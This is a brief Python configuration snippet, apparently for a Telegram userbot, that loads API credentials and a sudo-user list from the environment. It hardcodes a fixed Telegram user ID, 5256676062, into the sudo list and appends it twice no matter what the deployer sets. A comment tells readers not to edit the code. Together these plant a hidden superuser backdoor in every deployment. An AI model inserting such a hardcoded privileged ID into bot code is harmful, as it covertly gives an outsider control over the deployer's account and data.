






API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5256676062 not in SUDO_USERS: 
    SUDO_USERS.append(5256676062)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

#DON'T EDIT OR MESS WITH CODES



SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5256676062)
